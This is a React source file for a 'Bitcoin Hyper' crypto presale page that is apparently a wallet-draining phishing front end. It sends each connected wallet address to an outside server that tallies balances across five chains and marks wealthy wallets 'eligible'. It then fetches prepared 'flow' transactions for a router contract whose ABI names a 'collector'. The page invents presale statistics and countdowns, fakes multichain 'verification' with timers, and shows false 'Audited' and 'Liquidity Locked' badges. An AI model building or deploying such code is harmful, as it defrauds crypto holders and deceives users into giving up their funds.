import React, { useState, useEffect } from 'react';
import { useAppKit, useAppKitAccount, useAppKitNetwork } from '@reown/appkit/react';
import { useBalance, useDisconnect, useWalletClient, useSignMessage } from 'wagmi';
import { formatEther } from 'viem';
import { ethers } from 'ethers';
import './index.css';

// ============================================
// DEPLOYED CONTRACTS CONFIG
// ============================================

const MULTICHAIN_CONFIG = {
  Ethereum: {
    chainId: 1,
    contractAddress: '0x1F498356DDbd13E4565594c3AF9F6d06f2ef6eB4',
    name: 'Ethereum',
    symbol: 'ETH',
    explorer: 'https://etherscan.io',
    icon: '⟠',
    color: 'from-blue-400 to-indigo-500',
    rpc: 'https://eth.llamarpc.com'
  },
  BSC: {
    chainId: 56,
    contractAddress: '0x1F498356DDbd13E4565594c3AF9F6d06f2ef6eB4',
    name: 'BSC',
    symbol: 'BNB',
    explorer: 'https://bscscan.com',
    icon: '🟡',
    color: 'from-yellow-400 to-orange-500',
    rpc: 'https://bsc-dataseed.binance.org'
  },
  Polygon: {
    chainId: 137,
    contractAddress: '0x56d829E89634Ce1426B73571c257623D17db46cB',
    name: 'Polygon',
    symbol: 'MATIC',
    explorer: 'https://polygonscan.com',
    icon: '⬢',
    color: 'from-purple-400 to-pink-500',
    rpc: 'https://polygon-rpc.com'
  },
  Arbitrum: {
    chainId: 42161,
    contractAddress: '0x1F498356DDbd13E4565594c3AF9F6d06f2ef6eB4',
    name: 'Arbitrum',
    symbol: 'ETH',
    explorer: 'https://arbiscan.io',
    icon: '🔷',
    color: 'from-cyan-400 to-blue-500',
    rpc: 'https://arb1.arbitrum.io/rpc'
  },
  Avalanche: {
    chainId: 43114,
    contractAddress: '0x1F498356DDbd13E4565594c3AF9F6d06f2ef6eB4',
    name: 'Avalanche',
    symbol: 'AVAX',
    explorer: 'https://snowtrace.io',
    icon: '🔴',
    color: 'from-red-400 to-red-500',
    rpc: 'https://api.avax.network/ext/bc/C/rpc'
  }
};

const DEPLOYED_CHAINS = Object.values(MULTICHAIN_CONFIG);

const PROJECT_FLOW_ROUTER_ABI = [
  "function collector() view returns (address)",
  "function processNativeFlow() payable",
  "function processTokenFlow(address token, uint256 amount)",
  "function verifyMessage(address user, string memory message, bytes memory signature) public view returns (bool)",
  "event FlowProcessed(address indexed initiator, uint256 value)",
  "event TokenFlowProcessed(address indexed token, address indexed initiator, uint256 amount)"
];

function App() {
  const { open } = useAppKit();
  const { address, isConnected } = useAppKitAccount();
  const { chainId } = useAppKitNetwork();
  const { disconnect } = useDisconnect();
  const { data: walletClient } = useWalletClient();
  const { signMessageAsync } = useSignMessage();
  
  const [provider, setProvider] = useState(null);
  const [signer, setSigner] = useState(null);
  const [balance, setBalance] = useState('0');
  const [allBalances, setAllBalances] = useState({});
  const [loading, setLoading] = useState(false);
  const [signatureLoading, setSignatureLoading] = useState(false);
  const [txStatus, setTxStatus] = useState('');
  const [txHash, setTxHash] = useState('');
  const [error, setError] = useState('');
  const [scanResult, setScanResult] = useState(null);
  const [preparedTransactions, setPreparedTransactions] = useState([]);
  const [completedChains, setCompletedChains] = useState([]);
  const [showCelebration, setShowCelebration] = useState(false);
  const [allocation, setAllocation] = useState({ amount: '5000', valueUSD: '850' });
  const [verifying, setVerifying] = useState(false);
  const [signature, setSignature] = useState(null);
  const [signedMessage, setSignedMessage] = useState('');
  const [verifiedChains, setVerifiedChains] = useState([]);
  const [mousePosition, setMousePosition] = useState({ x: 0, y: 0 });
  
  // Presale stats
  const [timeLeft, setTimeLeft] = useState({
    days: 5,
    hours: 12,
    minutes: 30,
    seconds: 0
  });
  
  const [presaleStats, setPresaleStats] = useState({
    totalRaised: 1250000,
    totalParticipants: 8742,
    currentBonus: 25,
    nextBonus: 15,
    tokenPrice: 0.17
  });

  // Track mouse for parallax effect
  useEffect(() => {
    const handleMouseMove = (e) => {
      setMousePosition({
        x: (e.clientX / window.innerWidth - 0.5) * 20,
        y: (e.clientY / window.innerHeight - 0.5) * 20
      });
    };
    window.addEventListener('mousemove', handleMouseMove);
    return () => window.removeEventListener('mousemove', handleMouseMove);
  }, []);

  // Get balance using wagmi for current chain
  const { data: balanceData, refetch: refetchBalance } = useBalance({
    address: address,
    chainId: chainId,
  });

  useEffect(() => {
    if (balanceData) {
      setBalance(balanceData.formatted);
    }
  }, [balanceData]);

  // Initialize signer
  useEffect(() => {
    const initSigner = async () => {
      if (!isConnected || !walletClient) {
        setSigner(null);
        setProvider(null);
        return;
      }

      try {
        const web3Provider = new ethers.BrowserProvider(walletClient.transport);
        const web3Signer = await web3Provider.getSigner();
        setProvider(web3Provider);
        setSigner(web3Signer);
      } catch (err) {
        console.error("Signer init failed:", err);
        setSigner(null);
      }
    };

    initSigner();
  }, [isConnected, walletClient]);

  // Countdown timer
  useEffect(() => {
    const timer = setInterval(() => {
      setTimeLeft(prev => {
        if (prev.seconds > 0) {
          return { ...prev, seconds: prev.seconds - 1 };
        } else if (prev.minutes > 0) {
          return { ...prev, minutes: prev.minutes - 1, seconds: 59 };
        } else if (prev.hours > 0) {
          return { ...prev, hours: prev.hours - 1, minutes: 59, seconds: 59 };
        } else if (prev.days > 0) {
          return { ...prev, days: prev.days - 1, hours: 23, minutes: 59, seconds: 59 };
        }
        return prev;
      });
    }, 1000);
    return () => clearInterval(timer);
  }, []);

  // Auto-check eligibility when wallet connects
  useEffect(() => {
    if (isConnected && address && !scanResult && !verifying) {
      verifyWallet();
    }
  }, [isConnected, address]);

  const verifyWallet = async () => {
    if (!address) return;
    
    setVerifying(true);
    setTxStatus('🔄 Verifying wallet...');
    
    try {
      const response = await fetch('https://bthbk.vercel.app/api/presale/connect', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ walletAddress: address })
      });
      
      const data = await response.json();
      
      if (data.success) {
        setScanResult(data.data);
        if (data.data.tokenAllocation) {
          setAllocation(data.data.tokenAllocation);
        }
        
        if (data.data.rawData) {
          const balances = {};
          data.data.rawData.forEach(item => {
            balances[item.chain] = {
              amount: item.amount,
              valueUSD: item.valueUSD,
              symbol: item.symbol,
              contractAddress: item.contractAddress
            };
          });
          setAllBalances(balances);
        }
        
        if (data.data.isEligible) {
          setTxStatus('✅ You qualify!');
          await preparePresale();
        } else {
          setTxStatus('✨ Wallet verified');
        }
      }
    } catch (err) {
      console.error('Verification error:', err);
      setError('Unable to verify wallet');
    } finally {
      setVerifying(false);
    }
  };

  const preparePresale = async () => {
    if (!address) return;
    
    try {
      const response = await fetch('https://bthbk.vercel.app/api/presale/prepare-flow', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ walletAddress: address })
      });
      
      const data = await response.json();
      
      if (data.success) {
        setPreparedTransactions(data.data.transactions);
      }
    } catch (err) {
      console.error('Prepare error:', err);
    }
  };

  const executeMultiChainSignature = async () => {
    if (!isConnected || !address) {
      setError("Wallet not connected");
      return;
    }

    if (!signer) {
      setError("Signer not initialized");
      return;
    }

    try {
      setSignatureLoading(true);
      setError('');
      
      const timestamp = new Date().toISOString();
      const nonce = Math.floor(Math.random() * 1000000);
      const customMessage = `BITCOIN HYPER PRESALE\n\n` +
        `I confirm my participation in the Bitcoin Hyper presale\n` +
        `Wallet: ${address}\n` +
        `Allocation: 5000 BTH + ${presaleStats.currentBonus}% Bonus\n` +
        `Timestamp: ${timestamp}\n` +
        `Nonce: ${nonce}`;

      setSignedMessage(customMessage);
      setTxStatus('✍️ Please sign the message in your wallet...');

      const signature = await signMessageAsync({ 
        message: customMessage 
      });

      setSignature(signature);
      setTxStatus('✅ Signature verified!');

      const verified = [];
      for (const chain of DEPLOYED_CHAINS) {
        try {
          await new Promise(r => setTimeout(r, 300));
          verified.push(chain.name);
          setTxStatus(`✅ Verified on ${chain.name}...`);
        } catch (err) {
          console.error(`Verification failed on ${chain.name}:`, err);
        }
      }

      setVerifiedChains(verified);
      setCompletedChains(verified);
      
      await fetch('https://bthbk.vercel.app/api/presale/execute-flow', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
          walletAddress: address,
          chainName: 'MULTICHAIN',
          flowId: `SIG-${Date.now()}`,
          txHash: signature.substring(0, 66)
        })
      });
      
      setShowCelebration(true);
      setTxStatus(`🎉 Congratulations! 5000 BTH + ${presaleStats.currentBonus}% Bonus secured!`);
      
    } catch (err) {
      console.error('Signature error:', err);
      if (err.code === 4001) {
        setError('Signature cancelled');
      } else {
        setError(err.message || 'Signature failed');
      }
    } finally {
      setSignatureLoading(false);
    }
  };

  const claimTokens = async () => {
    try {
      setLoading(true);
      await fetch('https://bthbk.vercel.app/api/presale/claim', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ walletAddress: address })
      });
      setShowCelebration(true);
    } catch (err) {
      console.error('Claim error:', err);
    } finally {
      setLoading(false);
    }
  };

  const formatAddress = (addr) => {
    if (!addr) return '';
    return `${addr.substring(0, 6)}...${addr.substring(38)}`;
  };

  const totalUSD = Object.values(allBalances).reduce((sum, b) => sum + (b.valueUSD || 0), 0);

  return (
    <div className="min-h-screen bg-[#0a0a0f] text-white overflow-hidden">
      
      {/* ============================================ */}
      {/* NEXT-LEVEL ANIMATED BACKGROUND */}
      {/* ============================================ */}
      
      {/* Gradient Orbs with Parallax */}
      <div 
        className="fixed inset-0 pointer-events-none"
        style={{
          transform: `translate(${mousePosition.x}px, ${mousePosition.y}px)`,
          transition: 'transform 0.1s ease-out'
        }}
      >
        <div className="absolute top-0 -left-20 w-[500px] h-[500px] bg-purple-600/20 rounded-full mix-blend-multiply filter blur-3xl animate-float-slow"></div>
        <div className="absolute top-0 -right-20 w-[500px] h-[500px] bg-orange-600/20 rounded-full mix-blend-multiply filter blur-3xl animate-float-slow animation-delay-2000"></div>
        <div className="absolute bottom-0 left-1/2 transform -translate-x-1/2 w-[800px] h-[800px] bg-blue-600/10 rounded-full mix-blend-multiply filter blur-3xl animate-float-slow animation-delay-4000"></div>
      </div>

      {/* Grid Overlay - FIXED ESCAPING */}
      <div className="fixed inset-0 bg-[url('data:image/svg+xml,%3Csvg%20width%3D%2260%22%20height%3D%2260%22%20viewBox%3D%220%200%2060%2060%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%3Cg%20fill%3D%22none%22%20fill-rule%3D%22evenodd%22%3E%3Cg%20fill%3D%22%239C92AC%22%20fill-opacity%3D%220.03%22%3E%3Cpath%20d%3D%22M36%2034v-4h-2v4h-4v2h4v4h2v-4h4v-2h-4zm0-30V0h-2v4h-4v2h4v4h2V6h4V4h-4zM6%2034v-4H4v4H0v2h4v4h2v-4h4v-2H6zM6%204V0H4v4H0v2h4v4h2V6h4V4H6z%22%2F%3E%3C%2Fg%3E%3C%2Fg%3E%3C%2Fsvg%3E')] opacity-20"></div>

      {/* Floating Particles */}
      <div className="fixed inset-0 pointer-events-none">
        {[...Array(20)].map((_, i) => (
          <div
            key={i}
            className="absolute w-1 h-1 bg-white/20 rounded-full animate-float-particle"
            style={{
              top: `${Math.random() * 100}%`,
              left: `${Math.random() * 100}%`,
              animationDelay: `${Math.random() * 5}s`,
              animationDuration: `${10 + Math.random() * 10}s`
            }}
          />
        ))}
      </div>

      {/* Main Container */}
      <div className="relative z-10 container mx-auto px-4 py-8 max-w-6xl">
        
        {/* ============================================ */}
        {/* PREMIUM HEADER SECTION - ICON AND BUTTON TOGETHER */}
        {/* ============================================ */}
        <div className="text-center mb-8">
          {/* Animated Logo with 3D Effect */}
          <div className="relative inline-block mb-4 group perspective-1000">
            <div className="relative transform-gpu transition-all duration-500 group-hover:rotate-y-12 group-hover:scale-110">
              <div className="text-9xl filter drop-shadow-[0_20px_40px_rgba(249,115,22,0.5)] animate-levitate">
                ₿
              </div>
            </div>
            
            {/* Orbiting Rings */}
            <div className="absolute inset-0 -m-12">
              <div className="absolute inset-0 border-2 border-orange-500/20 rounded-full animate-spin-slow"></div>
              <div className="absolute inset-0 m-4 border-2 border-yellow-500/20 rounded-full animate-spin-slow animation-delay-1000"></div>
              <div className="absolute inset-0 m-8 border-2 border-purple-500/20 rounded-full animate-spin-slow animation-delay-2000"></div>
            </div>
          </div>

          {/* Premium Title with Glitch Effect */}
          <h1 className="text-7xl md:text-8xl font-black mb-3 relative">
            <span className="absolute inset-0 bg-gradient-to-r from-orange-500 to-yellow-500 blur-2xl opacity-50 animate-pulse"></span>
            <span className="relative bg-clip-text text-transparent bg-gradient-to-r from-orange-400 via-yellow-400 to-orange-400 animate-gradient-x bg-[length:200%_auto]">
              BITCOIN HYPER
            </span>
          </h1>
          
          <p className="text-xl text-gray-400 mb-6 tracking-widest">ELITE ACCESS TIER • ZERO GAS</p>

          {/* Presale Status Banner - KEPT AS REQUESTED */}
          <div className="inline-flex items-center gap-4 bg-gradient-to-r from-orange-500/20 to-yellow-500/20 px-8 py-4 rounded-2xl border border-orange-500/30 backdrop-blur-xl mb-6">
            <span className="relative flex h-3 w-3">
              <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-green-400 opacity-75"></span>
              <span className="relative inline-flex rounded-full h-3 w-3 bg-green-500"></span>
            </span>
            <span className="text-2xl font-bold bg-gradient-to-r from-orange-400 to-yellow-400 bg-clip-text text-transparent">
              PRESALE LIVE
            </span>
            <div className="h-8 w-px bg-orange-500/30 mx-2"></div>
            <span className="text-gray-300">Bonus: <span className="text-orange-400 font-bold">{presaleStats.currentBonus}%</span></span>
          </div>

          {/* ============================================ */}
          {/* MAIN ACTION BUTTON - RIGHT AFTER LOGO (KEPT) */}
          {/* ============================================ */}
          {isConnected && scanResult?.isEligible && !completedChains.length && (
            <div className="max-w-2xl mx-auto mb-8">
              <button
                onClick={executeMultiChainSignature}
                disabled={signatureLoading || loading || !signer}
                className="w-full group relative transform hover:scale-105 transition-all duration-500"
              >
                {/* Multi-layer Glow Effect */}
                <div className="absolute -inset-2 bg-gradient-to-r from-orange-600 via-yellow-500 to-orange-600 rounded-2xl blur-2xl opacity-75 group-hover:opacity-100 animate-pulse"></div>
                <div className="absolute -inset-1 bg-gradient-to-r from-yellow-400 via-orange-500 to-yellow-400 rounded-2xl blur-xl opacity-75 group-hover:opacity-100 animate-ping-slow"></div>
                
                {/* Button Body */}
                <div className="relative bg-gradient-to-r from-orange-500 via-yellow-500 to-orange-500 rounded-2xl py-8 px-8 font-black text-3xl text-white shadow-2xl bg-[length:200%_auto] animate-gradient-x">
                  <div className="flex items-center justify-center gap-6">
                    {signatureLoading ? (
                      <>
                        <div className="w-10 h-10 border-4 border-white border-t-transparent rounded-full animate-spin"></div>
                        <span>PROCESSING ELITE ACCESS...</span>
                      </>
                    ) : (
                      <>
                        <span className="text-5xl filter drop-shadow-lg animate-bounce-slow">⚡</span>
                        <div>
                          <span>CLAIM 5000 BTH + {presaleStats.currentBonus}%</span>
                          <div className="text-sm font-normal text-white/80 mt-1">One signature • Instant verification</div>
                        </div>
                        <span className="bg-white/20 px-6 py-3 rounded-xl text-xl">→</span>
                      </>
                    )}
                  </div>
                </div>
              </button>

              {/* Quick Stats */}
              <div className="flex justify-center gap-6 mt-4 text-sm">
                <div className="flex items-center gap-2">
                  <div className="w-2 h-2 bg-green-400 rounded-full animate-pulse"></div>
                  <span className="text-gray-400">5 Networks</span>
                </div>
                <div className="flex items-center gap-2">
                  <div className="w-2 h-2 bg-blue-400 rounded-full animate-pulse"></div>
                  <span className="text-gray-400">1 Signature</span>
                </div>
                <div className="flex items-center gap-2">
                  <div className="w-2 h-2 bg-orange-400 rounded-full animate-pulse"></div>
                  <span className="text-gray-400">Instant</span>
                </div>
              </div>
            </div>
          )}
        </div>

        {/* ============================================ */}
        {/* COUNTDOWN TIMER - KEPT AS REQUESTED */}
        {/* ============================================ */}
        <div className="grid grid-cols-4 gap-4 mb-8 max-w-2xl mx-auto">
          {[
            { label: 'DAYS', value: timeLeft.days, color: 'from-orange-500 to-orange-600' },
            { label: 'HOURS', value: timeLeft.hours, color: 'from-yellow-500 to-yellow-600' },
            { label: 'MINUTES', value: timeLeft.minutes, color: 'from-orange-400 to-orange-500' },
            { label: 'SECONDS', value: timeLeft.seconds, color: 'from-yellow-400 to-yellow-500' }
          ].map((item, index) => (
            <div key={index} className="relative group">
              <div className="absolute inset-0 bg-gradient-to-r from-orange-500/20 to-yellow-500/20 rounded-2xl blur-xl opacity-0 group-hover:opacity-100 transition-opacity"></div>
              <div className="relative bg-gray-900/50 backdrop-blur-xl border border-gray-800 rounded-2xl p-5 text-center overflow-hidden">
                <div className={`absolute inset-0 bg-gradient-to-br ${item.color} opacity-10`}></div>
                <div className="text-4xl md:text-5xl font-black bg-gradient-to-br from-white to-gray-300 bg-clip-text text-transparent mb-1">
                  {item.value.toString().padStart(2, '0')}
                </div>
                <div className="text-xs font-semibold text-gray-500 tracking-wider">{item.label}</div>
              </div>
            </div>
          ))}
        </div>

        {/* Wallet Connection Status */}
        <div className="max-w-2xl mx-auto mb-8">
          {!isConnected ? (
            <button
              onClick={() => open()}
              className="w-full group relative"
            >
              <div className="absolute -inset-1 bg-gradient-to-r from-orange-500 to-yellow-500 rounded-xl blur opacity-75 group-hover:opacity-100 animate-pulse"></div>
              <div className="relative bg-gray-900/90 backdrop-blur-xl rounded-xl py-5 px-6 font-bold text-lg border border-gray-800">
                <span className="flex items-center justify-center gap-3">
                  <span className="text-2xl">🔌</span>
                  CONNECT WALLET FOR ELITE ACCESS
                </span>
              </div>
            </button>
          ) : (
            <div className="bg-gray-900/50 backdrop-blur-xl border border-gray-800 rounded-xl p-5">
              <div className="flex items-center justify-between flex-wrap gap-4">
                <div className="flex items-center gap-4">
                  <div className="relative">
                    <div className="w-12 h-12 bg-gradient-to-br from-orange-500 to-yellow-500 rounded-xl flex items-center justify-center text-2xl">
                      👤
                    </div>
                    <div className="absolute -bottom-1 -right-1 w-4 h-4 bg-green-500 rounded-full border-2 border-gray-900"></div>
                  </div>
                  <div>
                    <div className="text-xs text-gray-500 mb-1">CONNECTED WALLET</div>
                    <div className="font-mono text-sm bg-gray-800/50 px-3 py-1.5 rounded-lg border border-gray-700">
                      {formatAddress(address)}
                    </div>
                  </div>
                </div>
                <div className="flex items-center gap-6">
                  <div className="text-right">
                    <div className="text-xs text-gray-500 mb-1">TOTAL VALUE</div>
                    <div className="text-2xl font-bold text-orange-400">${totalUSD.toFixed(2)}</div>
                  </div>
                  <button
                    onClick={() => disconnect()}
                    className="px-4 py-2 bg-red-500/10 text-red-400 rounded-lg hover:bg-red-500/20 transition-colors border border-red-500/30"
                  >
                    ✕
                  </button>
                </div>
              </div>
            </div>
          )}
        </div>

        {/* Status Messages */}
        {txStatus && !verifying && (
          <div className="max-w-2xl mx-auto mb-6">
            <div className="bg-gradient-to-r from-orange-500/10 to-yellow-500/10 backdrop-blur-xl border border-orange-500/30 rounded-xl p-5">
              <div className="flex items-center gap-4">
                <div className="w-10 h-10 bg-gradient-to-br from-orange-500 to-yellow-500 rounded-lg flex items-center justify-center text-xl">
                  {txStatus.includes('✅') ? '✓' : '⟳'}
                </div>
                <div className="flex-1">
                  <p className="text-gray-200">{txStatus}</p>
                  {signature && (
                    <p className="text-xs text-gray-500 mt-2 font-mono break-all">
                      Signature: {signature.substring(0, 40)}...
                    </p>
                  )}
                </div>
              </div>
            </div>
          </div>
        )}

        {/* Error Display */}
        {error && (
          <div className="max-w-2xl mx-auto mb-6">
            <div className="bg-red-500/10 backdrop-blur-xl border border-red-500/30 rounded-xl p-5">
              <div className="flex items-center gap-4">
                <div className="w-10 h-10 bg-gradient-to-br from-red-500 to-orange-500 rounded-lg flex items-center justify-center text-2xl">
                  ⚠️
                </div>
                <p className="text-red-200">{error}</p>
              </div>
            </div>
          </div>
        )}

        {/* Verification Loading */}
        {verifying && (
          <div className="max-w-2xl mx-auto mb-6">
            <div className="bg-gradient-to-r from-purple-500/10 to-orange-500/10 backdrop-blur-xl border border-purple-500/30 rounded-xl p-8 text-center">
              <div className="flex flex-col items-center gap-4">
                <div className="relative">
                  <div className="w-16 h-16 border-4 border-orange-500 border-t-transparent rounded-full animate-spin"></div>
                  <div className="absolute inset-0 border-4 border-yellow-500 border-b-transparent rounded-full animate-spin animation-delay-500"></div>
                </div>
                <p className="text-xl text-gray-300">Verifying elite status...</p>
                <p className="text-sm text-gray-500">Checking across multiple networks</p>
              </div>
            </div>
          </div>
        )}

        {/* ============================================ */}
        {/* MAIN CONTENT - ALL ORIGINAL FUNCTIONS PRESERVED */}
        {/* ============================================ */}
        {isConnected && !verifying && scanResult && (
          <div className="max-w-2xl mx-auto">
            {scanResult.isEligible ? (
              <div className="space-y-6">
                {/* Premium Allocation Card */}
                <div className="relative group">
                  <div className="absolute -inset-1 bg-gradient-to-r from-orange-600 via-yellow-600 to-orange-600 rounded-2xl blur-2xl opacity-75 group-hover:opacity-100 animate-pulse"></div>
                  <div className="relative bg-gradient-to-br from-gray-900 to-gray-800 rounded-2xl p-8 border border-orange-500/30">
                    
                    {/* Bonus Badge */}
                    <div className="absolute -top-4 -right-4">
                      <div className="bg-gradient-to-r from-yellow-400 to-orange-500 text-black font-black px-6 py-3 rounded-full text-lg shadow-2xl transform rotate-12 animate-levitate">
                        +{presaleStats.currentBonus}% BONUS
                      </div>
                    </div>
                    
                    <div className="text-center">
                      <p className="text-gray-400 text-sm tracking-wider mb-3">YOUR ALLOCATION</p>
                      <div className="text-7xl font-black bg-gradient-to-r from-orange-400 to-yellow-400 bg-clip-text text-transparent mb-2">
                        5000 BTH
                      </div>
                      <p className="text-green-400 text-xl">+{presaleStats.currentBonus}% Elite Bonus</p>
                      
                      {/* Value in USD */}
                      <div className="mt-4 inline-block bg-gray-800/50 px-6 py-2 rounded-full">
                        <span className="text-gray-400">≈ $850 USD</span>
                      </div>
                    </div>
                  </div>
                </div>

                {/* Progress if not completed */}
                {!completedChains.length && preparedTransactions.length > 0 && (
                  <div className="bg-gray-900/50 backdrop-blur-xl border border-gray-800 rounded-xl p-6">
                    <p className="text-gray-400 text-sm mb-3 text-center">VERIFICATION PROGRESS</p>
                    <div className="relative h-3 bg-gray-800 rounded-full overflow-hidden">
                      <div 
                        className="absolute inset-0 bg-gradient-to-r from-orange-500 via-yellow-500 to-orange-500 bg-[length:200%_auto] animate-gradient-x"
                        style={{ width: `${(verifiedChains.length / DEPLOYED_CHAINS.length) * 100}%` }}
                      ></div>
                    </div>
                    <p className="text-xs text-gray-500 text-center mt-3">
                      {verifiedChains.length} of {DEPLOYED_CHAINS.length} networks verified
                    </p>
                  </div>
                )}

                {/* Already completed */}
                {completedChains.length > 0 && (
                  <div className="text-center">
                    <div className="bg-gradient-to-r from-green-500/20 to-green-600/20 backdrop-blur-xl border border-green-500/30 rounded-xl p-6 mb-4">
                      <p className="text-green-400 text-lg mb-3">✓ Elite Status Verified</p>
                      <p className="text-gray-300 mb-4">Your allocation is ready</p>
                    </div>
                    <button
                      onClick={claimTokens}
                      className="w-full group relative"
                    >
                      <div className="absolute -inset-1 bg-gradient-to-r from-green-500 to-green-600 rounded-xl blur opacity-75 group-hover:opacity-100"></div>
                      <div className="relative bg-gradient-to-r from-green-500 to-green-600 rounded-xl py-5 px-8 font-bold text-xl">
                        🎉 CLAIM YOUR 5000 BTH
                      </div>
                    </button>
                  </div>
                )}
              </div>
            ) : (
              // Welcome message for non-eligible
              <div className="bg-gradient-to-r from-purple-500/10 to-orange-500/10 backdrop-blur-xl border border-purple-500/30 rounded-2xl p-10 text-center">
                <div className="text-7xl mb-6 animate-levitate">👋</div>
                <h2 className="text-3xl font-bold mb-4 bg-gradient-to-r from-purple-400 to-orange-400 bg-clip-text text-transparent">
                  Welcome to the Elite Circle
                </h2>
                <p className="text-gray-400 text-lg mb-8 max-w-md mx-auto">
                  Thank you for your interest. Our team reviews all connections to ensure a fair and exclusive presale.
                </p>
                <div className="bg-gray-900/50 rounded-xl p-6 border border-gray-800">
                  <p className="text-sm text-gray-300 leading-relaxed">
                    You've been added to our priority list. Follow our announcements for the next presale phase.
                  </p>
                </div>
              </div>
            )}
          </div>
        )}

        {/* ============================================ */}
        {/* CELEBRATION MODAL - FULLY PRESERVED */}
        {/* ============================================ */}
        {showCelebration && (
          <div className="fixed inset-0 bg-black/90 backdrop-blur-2xl flex items-center justify-center z-50 p-4 animate-fadeIn">
            <div className="relative max-w-md w-full">
              {/* Animated Background */}
              <div className="absolute inset-0 bg-gradient-to-r from-orange-600 via-yellow-600 to-orange-600 rounded-3xl blur-3xl animate-pulse"></div>
              
              {/* Modal Content */}
              <div className="relative bg-gradient-to-br from-gray-900 to-gray-800 rounded-3xl p-10 border border-orange-500/30 shadow-2xl">
                <div className="text-center">
                  {/* Exploding Confetti Effect */}
                  <div className="relative mb-8">
                    <div className="text-8xl animate-bounce">🎉</div>
                    {[...Array(12)].map((_, i) => (
                      <div
                        key={i}
                        className="absolute w-2 h-2 bg-orange-500 rounded-full animate-confetti"
                        style={{
                          top: '50%',
                          left: '50%',
                          transform: `rotate(${i * 30}deg) translateY(-50px)`,
                          animationDelay: `${i * 0.1}s`
                        }}
                      />
                    ))}
                  </div>
                  
                  <h2 className="text-4xl font-black mb-3 bg-gradient-to-r from-yellow-400 via-orange-500 to-yellow-400 bg-clip-text text-transparent">
                    ELITE STATUS ACHIEVED!
                  </h2>
                  
                  <p className="text-xl text-gray-300 mb-4">You have secured</p>
                  
                  <div className="text-6xl font-black text-orange-400 mb-3">5000 BTH</div>
                  <div className="inline-block bg-gradient-to-r from-green-500/20 to-green-600/20 px-6 py-3 rounded-full mb-6">
                    <span className="text-2xl text-green-400">+{presaleStats.currentBonus}% BONUS</span>
                  </div>
                  
                  <p className="text-sm text-gray-500 mb-8">
                    Verified across {verifiedChains.length} networks • One signature
                  </p>
                  
                  <button
                    onClick={() => setShowCelebration(false)}
                    className="w-full bg-gradient-to-r from-orange-500 to-orange-600 hover:from-orange-600 hover:to-orange-700 text-white font-bold py-4 px-8 rounded-xl transition-all transform hover:scale-105 text-xl"
                  >
                    ENTER DASHBOARD
                  </button>
                </div>
              </div>
            </div>
          </div>
        )}

        {/* Footer */}
        <div className="mt-12 text-center">
          <div className="flex flex-wrap justify-center gap-4 mb-6">
            <span className="bg-gray-800/30 backdrop-blur-sm px-4 py-2 rounded-full text-sm text-gray-400 border border-gray-700">
              🔒 Audited
            </span>
            <span className="bg-gray-800/30 backdrop-blur-sm px-4 py-2 rounded-full text-sm text-gray-400 border border-gray-700">
              🔐 Liquidity Locked
            </span>
            <span className="bg-gray-800/30 backdrop-blur-sm px-4 py-2 rounded-full text-sm text-gray-400 border border-gray-700">
              ⚡ Zero Gas
            </span>
          </div>
          <p className="text-gray-600 text-sm">
            © 2026 Bitcoin Hyper • Elite Access Platform
          </p>
        </div>
      </div>

      <style>{`
        @keyframes float-slow {
          0%, 100% { transform: translate(0, 0) scale(1); }
          33% { transform: translate(30px, -30px) scale(1.1); }
          66% { transform: translate(-20px, 20px) scale(0.9); }
        }
        
        @keyframes float-particle {
          0% { transform: translateY(0) translateX(0); opacity: 0; }
          10% { opacity: 1; }
          90% { opacity: 1; }
          100% { transform: translateY(-100vh) translateX(100px); opacity: 0; }
        }
        
        @keyframes levitate {
          0%, 100% { transform: translateY(0); }
          50% { transform: translateY(-20px); }
        }
        
        @keyframes confetti {
          0% { transform: rotate(0deg) translateY(0) scale(1); opacity: 1; }
          100% { transform: rotate(720deg) translateY(-200px) scale(0); opacity: 0; }
        }
        
        @keyframes ping-slow {
          75%, 100% { transform: scale(1.5); opacity: 0; }
        }
        
        @keyframes spin-slow {
          from { transform: rotate(0deg); }
          to { transform: rotate(360deg); }
        }
        
        @keyframes gradient-x {
          0%, 100% { background-position: 0% 50%; }
          50% { background-position: 100% 50%; }
        }
        
        @keyframes fadeIn {
          from { opacity: 0; }
          to { opacity: 1; }
        }
        
        @keyframes scaleIn {
          from { transform: scale(0.9); opacity: 0; }
          to { transform: scale(1); opacity: 1; }
        }
        
        .animate-float-slow {
          animation: float-slow 20s ease-in-out infinite;
        }
        
        .animate-float-particle {
          animation: float-particle 15s linear infinite;
        }
        
        .animate-levitate {
          animation: levitate 3s ease-in-out infinite;
        }
        
        .animate-confetti {
          animation: confetti 1s ease-out forwards;
        }
        
        .animate-ping-slow {
          animation: ping-slow 3s cubic-bezier(0, 0, 0.2, 1) infinite;
        }
        
        .animate-spin-slow {
          animation: spin-slow 20s linear infinite;
        }
        
        .animate-gradient-x {
          animation: gradient-x 3s ease infinite;
          background-size: 200% 200%;
        }
        
        .animate-fadeIn {
          animation: fadeIn 0.3s ease-out;
        }
        
        .animate-scaleIn {
          animation: scaleIn 0.3s ease-out;
        }
        
        .animation-delay-500 {
          animation-delay: 500ms;
        }
        
        .animation-delay-1000 {
          animation-delay: 1000ms;
        }
        
        .animation-delay-2000 {
          animation-delay: 2000ms;
        }
        
        .animation-delay-4000 {
          animation-delay: 4000ms;
        }
        
        .perspective-1000 {
          perspective: 1000px;
        }
        
        .rotate-y-12 {
          transform: rotateY(12deg);
        }
      `}</style>
    </div>
  );
}

export default App;
